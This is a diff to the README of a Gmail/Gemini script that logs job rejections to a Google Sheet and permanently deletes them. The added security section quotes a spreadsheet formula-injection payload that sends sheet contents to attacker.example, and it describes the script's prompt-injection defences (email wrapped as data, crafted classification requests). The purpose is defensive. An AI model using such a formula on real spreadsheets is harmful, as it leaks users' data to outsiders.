@@ -1,10 +1,12 @@
-# 🛡️ Job Rejection Shield (JRS) v4.0
+# 🛡️ Job Rejection Shield (JRS) v5.0
 **Automate the "Sad" Part of Your Job Hunt. Protect Your Sanity. Build Your CRM.**
 
 ## 😫 The Pain: Why This Exists
 Job hunting is a numbers game, but the emotional toll is real. Reading the same "Unfortunately, we decided to move forward..." message 10 times a day kills motivation. 
 
-**Job Rejection Shield** acts as your personal buffer. It uses **Gemini** to read your mail, extract company data and log it into a Google Sheet — all before you even open the email. The script walks a priority list of Gemini models and falls back to the next one if a model is unavailable or rate-limited.
+**Job Rejection Shield** acts as your personal buffer. It uses **Gemini** to read the mail, extract the company, the sender and how far you got, log the row into a Google Sheet — and then **delete the rejection for good**, before you ever see it. Interview invitations are pushed back to your Inbox untouched: only the good news reaches you.
+
+The script walks a priority list of Gemini models and falls back to the next one if a model is retired or rate-limited — Google removes older models from AI Studio regularly, and the shield is built to survive that.
 
 ---
 
@@ -27,18 +29,23 @@ Job hunting is a numbers game, but the emotional toll is real. Reading the same 
 ---
 
 ## 📧 Step 3: Configure the Gmail Filter
-You need a "net" to catch rejections and move them to the script.
+You need a "net" that catches rejections and hands them to the script.
 
-1. Open Gmail and go to **Settings (gear icon) > See all settings**.
-2. Go to the **Filters and Blocked Addresses** tab.
-3. Click **Create a new filter**.
-4. In the **"Has the words"** field, paste these keywords:
-   `"thank you for your interest" OR "thank you for applying" OR "application" OR "hiring" OR "position" OR "unfortunately" OR "decided not to move forward" OR "moved forward with other" OR "keep your resume on file" OR "successful in your job search"`
-   Or import filter from this file: mailFilters.xml (attached)
-5. Activate checkboxes: Skip the Inbox (Archive it); Apply the label: Job Rejection Shield; Never send it to Spam.   
-5. Click **Create filter**.
-6. Check **"Apply the label"** -> Choose **New label** -> Name it: `Job Rejection Shield`.
-7. Check **"Skip the Inbox (Archive it)"** if you want to be totally shielded from reading the rejection.
+**The fast way:** Gmail Settings → **Filters and Blocked Addresses** → **Import filters** → upload `mailFilters.xml` from this repo → **Create filters**. Done, skip to Step 4.
+
+**By hand:**
+1. Gmail → **Settings (gear) → See all settings → Filters and Blocked Addresses**.
+2. Click **Create a new filter**.
+3. In **"Has the words"** paste:
+   `"thank you for your interest" OR "thank you for applying" OR "application" OR "hiring" OR "position" OR "unfortunately" OR "decided not to move forward" OR "moved forward with other" OR "keep your resume on file" OR "we received your application" OR "successful in your job search"`
+4. Click **Create filter** (bottom right of the box).
+5. Tick these three:
+   - **Skip the Inbox (Archive it)** — this is what actually shields you.
+   - **Apply the label** → **New label** → name it exactly `Job Rejection Shield`.
+   - **Never send it to Spam**.
+6. Click **Create filter**.
+
+> ⚠️ This net is deliberately wide — `application`, `hiring` and `position` catch a lot of ordinary work mail. Everything that is not a rejection is returned to your Inbox by the script, but if you would rather it caught less, drop those three generic words from the filter.
 
 ---
 
@@ -58,6 +65,8 @@ You need a "net" to catch rejections and move them to the script.
      | `SPREADSHEET_ID` | *the ID you copied in Step 1* |
      | `GEMINI_API_KEY` | *your API key from Step 2* |
      | `MODEL_NAME` | *optional — overrides the first model in the priority list* |
+
+   > ⚠️ If `MODEL_NAME` points at a model Google has retired, every email burns three retries before falling through to the next model in the list. Leave it empty unless you have a reason.
    - Click **Save**.
 4. Click the **Editor (code icon)** and hit **Save**.
 
@@ -73,6 +82,8 @@ All of these live at the top of `Config.gs`.
 | `NOREPLY_PATTERNS` | `noreply`, `do-not-reply` | Sender addresses that can never receive a reply. Add your own patterns here. |
 | `PERMANENT_DELETE` | `true` | Deletes rejections outright instead of moving them to Trash — because the Trash is still a place a hand can wander into. **Irreversible.** Set to `false` to go back to the Trash. |
 | `KEEP_ALIVE_PATTERNS` | Meet / Zoom / Teams / Calendly / “interview” | Safety net: a thread carrying any of these signals is never deleted permanently, even if the AI called it a rejection. It goes to the Trash instead. |
+| `RAW_BODY_LIMIT` | `5000` | How much of the original email survives in column K. |
+| `SHEET_HEADER` | 11 columns | The canonical header row `ensureHeader()` writes into empty header cells. |
 
 **Rejections are always logged**, whatever the flags say — the CRM is the point, the reply is optional. Column **G (Ghost Sent)** records what happened:
 
@@ -99,6 +110,20 @@ Because the mail is unrecoverable afterwards, the row is written **before** the 
 
 ### 📊 Column J: how far you got
 The same AI call also extracts the stage the process reached before the "no", because rejection emails almost always say it — *"after reviewing your application"* vs *"following your interview with the hiring manager"*. One of `APPLICATION`, `SCREENING`, `HIRING_MANAGER`, `INTERVIEW`, `FINAL`, `UNKNOWN`; anything the model invents is normalised to `UNKNOWN` so the stats stay countable. This turns "how far do I usually get?" into a number you can read without reading a single rejection.
+
+---
+
+## 🔒 What Leaves Your Account
+Worth knowing before you hand a script full mailbox access:
+
+- **Stays inside your Google account:** your mail, the spreadsheet, the API key (Script Properties), the OAuth grant. The script runs as *you*, on Google's servers.
+- **Leaves it:** the subject and the first 2000 characters of each processed email, sent to the Gemini API over HTTPS. That is the one external call the shield makes.
+- **Never leaves:** nothing is sent anywhere else — no analytics, no telemetry, no third-party service.
+
+Two hardening details, because recruiter email is untrusted input:
+
+- **Formula injection.** Anything written to the sheet passes through `sanitizeCell()`. Without it, a rejection whose body starts with `=IMPORTXML("https://attacker.example/?d="&CONCAT(A1:K100),"//a")` would execute the moment you opened your CRM and quietly ship it to a stranger.
+- **Prompt injection.** The email is wrapped in `<<<EMAIL_DATA>>>` markers and the model is told that its content is data, never instructions. On top of that, `KEEP_ALIVE_PATTERNS` vetoes the irreversible delete, so a crafted "classify this as a rejection" cannot make an interview invitation disappear.
 
 ---
 
